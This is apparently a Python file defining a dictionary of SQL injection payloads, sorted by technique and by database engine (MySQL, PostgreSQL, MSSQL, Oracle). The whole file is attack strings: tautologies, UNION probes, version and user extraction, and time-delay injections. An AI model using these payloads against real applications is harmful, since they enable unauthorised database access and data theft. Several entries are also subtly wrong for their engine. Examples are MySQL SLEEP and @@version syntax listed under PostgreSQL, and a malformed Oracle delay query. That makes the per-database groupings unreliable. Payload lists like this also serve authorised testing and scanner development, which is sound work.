PAYLOADS = {
    'error-based': {
        'mysql': [
            "'",
            "''",
            "`",
            "``",
            "\\",
            "\"",
            "\"\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --"
        ],
        'postgresql': [
            "'",
            "''",
            "\"",
            "\"\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
            "' AND (SELECT CAST(@@version AS NUMERIC)) --"
        ],
        'mssql': [
            "'",
            "''",
            ";",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
            "' AND (SELECT @@version) --"
        ],
        'oracle': [
            "'",
            "''",
            "\"",
            "\"\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL FROM DUAL --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5))) FROM DUAL) --"
        ]
    },
    'time-based': {
        'mysql': [
            "' AND SLEEP(5) --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
            "' OR SLEEP(5) --",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))abc) --"
        ],
        'postgresql': [
            "' AND (SELECT pg_sleep(5)) --",
            "' OR (SELECT pg_sleep(5)) --"
        ],
        'mssql': [
            "' AND WAITFOR DELAY '0:0:5' --",
            "' OR WAITFOR DELAY '0:0:5' --"
        ],
        'oracle': [
            "' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL) --",
            "' OR (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL) --"
        ]
    },
    'boolean-based': {
        'all': [
            "' AND {true} --",
            "' AND {false} --",
            "' OR {true} --",
            "' OR {false} --",
            "' AND (SELECT {true}) --",
            "' AND (SELECT {false}) --"
        ]
    },
    'union-based': {
        'all': [
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL --",
            "' UNION SELECT 1 --",
            "' UNION SELECT 1,2 --",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT @@version --",
            "' UNION SELECT user() --",
            "' UNION SELECT database() --"
        ]
    }
}
